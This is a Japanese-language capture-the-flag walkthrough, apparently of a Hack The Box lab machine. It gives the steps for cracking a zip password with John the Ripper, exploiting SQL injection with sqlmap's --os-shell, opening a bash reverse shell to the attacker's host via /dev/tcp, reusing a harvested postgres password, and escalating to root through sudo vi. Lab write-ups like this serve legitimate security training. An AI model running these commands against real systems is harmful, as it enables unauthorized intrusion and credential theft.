# 1.Port Scan
ip=10.129.160.207
nmap -sC -sV $ip

![4cd671fbf64e0a60206bd083b22d6718.png](../_resources/4cd671fbf64e0a60206bd083b22d6718.png)

# 2.FTP Login
nmapから得た情報を使いFTPサーバにログインする。
backup.zipを確認。

ftp $ip

![0246dd1b5cd894512e6f1b007b974e5b.png](../_resources/0246dd1b5cd894512e6f1b007b974e5b.png)

# 3. Zip2john

backup.zupのhase値を出力

`zip2john backup.zip > hashes`

![4bc6747c4aff6f97108d51695c988b12.png](../_resources/4bc6747c4aff6f97108d51695c988b12.png)

John the Ripperを使いパスワードを解析

`cat hashes`

`john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

![1d9b7c1bca052b9fccd0000ff47b016d.png](../_resources/1d9b7c1bca052b9fccd0000ff47b016d.png)

中身を確認
ユーザネームとパスワードを発見

cat index.php

![711c6d060e37349d300d6438d860a12c.png](../_resources/711c6d060e37349d300d6438d860a12c.png)

使用できるハッシュ形式を確認。

`hashid 2cb42f8734ea607eefed3b70af13bbd3`  

![ccfe9b2fd0886cca220012aa78c8163a.png](../_resources/ccfe9b2fd0886cca220012aa78c8163a.png)

Web site上のadminユーザのパスワードを確認

![7683f18cc4107f0a07daef542ddfde42.png](../_resources/7683f18cc4107f0a07daef542ddfde42.png)

# 4.Web site login

Web siteにログイン

![f961fa5da593059b9107e4b21a8f3c22.png](../_resources/f961fa5da593059b9107e4b21a8f3c22.png)

![e659228b8fdb3272ed3bc31d6e770665.png](../_resources/e659228b8fdb3272ed3bc31d6e770665.png)

cookie editorを使いcookieを確認

![f1809a694fdb54b039c6f6ab3366c8d7.png](../_resources/f1809a694fdb54b039c6f6ab3366c8d7.png)


# 5. Sql map

sqlmap を使い対象websiteへのSQLインジェクションの脆弱性を確認。

`sqlmap -u 'http://$ip/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

![3ffe23ca967636a8f7c857cf5d89af44.png](../_resources/3ffe23ca967636a8f7c857cf5d89af44.png)

sql mapを使い --os-shell で接続

`sqlmap --os-shell -u 'http://$ip/dashboard.php?search=any+query' --cookie="PHPSESSID=js7su4b1p3lq9u0q2qqvtmj4ej"`      

os-shellからバッシュを使いローカルPCへ接続する

`bash -c "bash -i >& /dev/tcp/10.10.16.18/443 0>&1"`

![6471f2c462bdc3fb81444e1af2f84bda.png](../_resources/6471f2c462bdc3fb81444e1af2f84bda.png)

`sudo nc -lvnp 443`

![e5e48a5f2b08f760cd0c8cababb8779e.png](../_resources/e5e48a5f2b08f760cd0c8cababb8779e.png)

directory一覧を確認

ls

![d5332d259e2f3397810deb91b57d6034.png](../_resources/d5332d259e2f3397810deb91b57d6034.png)

dashboard.php からuser名とpasswordを取得

cat dashboard.php

user:postgres

password:P@s5w0rd!

![a5efba060492f372c54f32d70de2195e.png](../_resources/a5efba060492f372c54f32d70de2195e.png)

# 6.SSH

SSHで接続

![1fbb3355dc0cec5994e1c08cdf6688ec.png](../_resources/1fbb3355dc0cec5994e1c08cdf6688ec.png)

root権限で実行できるコマンドを確認

sudo -l

![7a77beeca06ae8e3f44b1cb3e1ee9ede.png](../_resources/7a77beeca06ae8e3f44b1cb3e1ee9ede.png)

コマンド実行

参考URL:https://gtfobins.github.io/gtfobins/vi/#sudo

vimはsudoで事項した場合管理者権限で実行できる。

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

![c92eae19ad9a1741b592de5d03b2d76e.png](../_resources/c92eae19ad9a1741b592de5d03b2d76e.png)

shellを実行

vi
:set shell=/bin/sh
:shell

![1ede944c88255c2a14fa095e141f455d.png](../_resources/1ede944c88255c2a14fa095e141f455d.png)


![977c027713fcf1b3fb34eabf68dd0bb8.png](../_resources/977c027713fcf1b3fb34eabf68dd0bb8.png)

# 7.flag get

![f0900b4652123904532d6b87f56a7909.png](../_resources/f0900b4652123904532d6b87f56a7909.png)